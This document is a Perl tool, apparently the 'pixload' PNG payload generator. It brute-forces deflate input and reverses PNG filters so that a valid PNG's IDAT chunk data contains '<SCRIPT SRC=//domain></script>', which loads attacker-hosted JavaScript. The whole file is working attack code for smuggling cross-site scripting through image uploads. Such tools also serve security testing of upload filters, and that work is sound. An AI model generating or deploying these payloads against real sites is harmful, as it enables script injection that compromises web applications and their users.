#!/usr/bin/perl
#
# PNG IDAT chunks ~ JS payload generator
#
# coded by chinarulezzz, alexandr.savca89@gmail.com
# based on work of Kamil Vavra
# credits to @Adam_Logue && @fin1te && idontplaydarts && Kamil Vavra
#
# See LICENSE file for copyright and license details.
#

use strict;
use feature qw(say);

use warnings;

# Hexadecimal number > 0xffffffff non-portable
no warnings qw(portable);

use GD;
use URI;
use POSIX;
use Getopt::Long;
use String::HexConvert      qw(:all);
use IO::Compress::Deflate   qw(deflate $DeflateError);

sub usage;
sub bruteforce;
sub png_filters;
sub create_png;

# Command line options
GetOptions(
    'help!'     =>  \my $opt_help,
    'domain=s'  =>  \my $opt_domain,
    'output=s'  =>  \my $opt_output
);

usage(0) if $opt_help;
usage(1) unless $opt_domain;
usage(2) unless $opt_output;

$opt_domain = uc $opt_domain;

# Config variables
my  $uri                    = URI->new("https://$opt_domain");
my ($short_domain, $tld)    = (split /\./, $uri->host)[0,1];

die "[?] Sorry, only 3 characters domains supported\n"
    if length $short_domain > 3;

my $payload                 = "<SCRIPT SRC=//${opt_domain}></script>";

say <<EOF;
[>| PNG IDAT chunks ~ JS Payload Generator |<]
    
    https://github.com/chinarulezzz/pixload

EOF

my @bytes                   = bruteforce;
my @png_array               = png_filters @bytes;

create_png @png_array;

say `file $opt_output`      if -f '/usr/bin/file';
say `hexdump -C $opt_output`if -f '/usr/bin/hexdump';

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#                                Subroutines                                  #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

sub usage {
    say <<"EOF";
Usage: $0 -domain xxe.cz -output payload.png

Note: Only 3 characters domains supported.
EOF
    exit +shift;
}

sub bruteforce
{
    print <<"EOF";
[>] Starting GZDeflate bruteforce

    Domain: $opt_domain
    Payload: $payload

    It will take some time ~ please wait :)

EOF

    #######################################################################

    print "[>] Bruteforcing tld\n";

    my $brute_tld_count = eval('0x' . 'ff' x length $tld);
    my $tld_hex;

    for (my $i = 0x11; $i < $brute_tld_count; $i++) {

        my $brute       = sprintf("%x", $i);
        my $bin_brute   = hex_to_ascii(
              '0000f399281922111510691928276e6e5313241e'
            .  $brute
            . '1f576e69b16375535b6f0000'
        );

        deflate \$bin_brute => \my $out
            or die "Deflate failed: $DeflateError\n";

        # Search payload in GZDeflate output
        if (
            index(
                $out,
                "<SCRIPT SRC=//XXE.${tld}></script>"
            ) != -1
        ) {
            say "[✔] TLD successfully bruteforced\n";
            $tld_hex = $brute;
            last;
        }
    }
    die "[✘] Error: something went wrong with TLD\n\n"
        unless $tld_hex;

    #######################################################################
    
    print "[>] Bruteforcing domain\n";

    my $first  = substr($short_domain, 0, 1);
    my $second = substr($short_domain, 1, 1);
    my $third  = substr($short_domain, 2, 1);

    #
    # Brute 3'rd character
    #

    my $third_hex;

    for (my $i = 0x11 ; $i < 0xffff ; $i++) {

        my $brute       = sprintf("%x", $i);
        my $bin_brute   = hex_to_ascii(
              '0000f399281922111510691928276e6e5313'
            .  $brute
            . '1e'
            .  $tld_hex
            . '1f576e69b16375535b6f0000'
        );

        deflate \$bin_brute => \my $out
            or die "Deflate failed: $DeflateError\n";

        if (
            index(
                $out,
                "<SCRIPT SRC=//XX${third}.${tld}></script>"
            ) != -1
        ) {
            $third_hex = $brute;
            say "[✔] 3rd '$third' character bruteforced";
            last;
        }
    }
    die "[✘] Error: something went wrong with '$third' character\n"
        unless $third_hex;

    #
    # Brute 2'nd character
    #

    my $second_hex;

    for (my $i = 0x11 ; $i < 0xffff ; $i++) {

        my $brute       = sprintf("%x", $i);
        my $bin_brute   = hex_to_ascii(
              '0000f399281922111510691928276e6e53'
            .  $brute
            .  $third_hex
            . '1e'
            .  $tld_hex
            . '1f576e69b16375535b6f0000'
        );

        deflate \$bin_brute => \my $out
            or die "Deflate failed: $DeflateError\n";

        if (
            index(
                $out,
                "<SCRIPT SRC=//X${second}${third}.${tld}></script>"
            ) != -1
        ) {
            $second_hex = $brute;
            say "[✔] 2nd '$second' character bruteforced";
            last;
        }
    }
    die "[✘] Error: something went wrong with '$second' character\n"
        unless $second_hex;

    #
    # Brute 1'st character
    #

    for (my $i = 0x11; $i < 0xffff; $i++) {

        my $brute       = sprintf("%x", $i);
        my $bin_brute   = hex_to_ascii(
              '0000f399281922111510691928276e6e'
            .  $brute
            .  $second_hex
            .  $third_hex
            . '1e'
            .  $tld_hex
            . '1f576e69b16375535b6f0000'
        );

        deflate \$bin_brute => \my $out
            or die "Deflate failed: $DeflateError\n";
        
        if (
            index(
                  $out,
                  "<SCRIPT SRC=//${first}${second}${third}.${tld}></script>"
            ) != -1
           )
        {
            say "[✔] 1st '$first' character bruteforced\n";

            # Save all payload accounted in $bin_brute, and
            # hex bytes need to be separated 0x13, 0x37, ...
            my @bytes = map hex, ascii_to_hex($bin_brute) =~ /../sg;

            return @bytes;
        }
    }
    
    die "[✘] Failed to bruteforce payload :(\n";
}

sub png_filters
{
    say "[>] Trying to apply PNG filters";

    my @bytes = (@_) x 2;

    # http://www.libpng.org/pub/png/spec/1.2/PNG-Filters.html

    # Reverse PNG Filter type 1: Sub
    # Sub(x) + Raw(x-bpp)
    for (my $i = 0; $i < @bytes/2 - 3; $i++) {
        $bytes[$i + 3] = ($bytes[$i + 3] + $bytes[$i]) % 256
    }

    # Reverse PNG Filter type 3: Average
    # Average(x) + floor((Raw(x-bpp)+Prior(x))/2)
    for (my $i = @bytes/2; $i < @bytes - 3; $i++) {
        $bytes[$i + 3] = ($bytes[$i + 3] + floor($bytes[$i] / 2)) % 256;
    }

    say "[✔] PNG filters done\n";
    return @bytes;
}

sub create_png
{
    say "[>] Generating output file";

    my (@png_array) = @_;

    # Create a new image
    my $img = GD::Image->new(
        32,
        32,
        1   # Set 1 to TrueColor (24 bits of color data), default is 8-bit palette
    );

    for (my $i = 0; $i < @png_array - 3; $i += 3) {
        my $r       = $png_array[$i];
        my $g       = $png_array[$i + 1];
        my $b       = $png_array[$i + 2];
        my $color   = $img->colorAllocate($r, $g, $b);

        $img->setPixel(floor($i / 3), 0, $color);
    }

    if (index($img->png, $payload) == -1) {
        die "[✘] Bad png file, this might not work\n";
    }

    say "[✔] PNG with payload successfully generated";
    say '    Hex payload: ' . ascii_to_hex($payload);

    # Convert into png data
    open my $fh, '>', $opt_output or die;
    binmode $fh;
    print   $fh  $img->png;
    close   $fh;

    say "[✔] File saved to: $opt_output\n";
}

# vim:sw=4:ts=4:sts=4:et:cc=80
# End of file
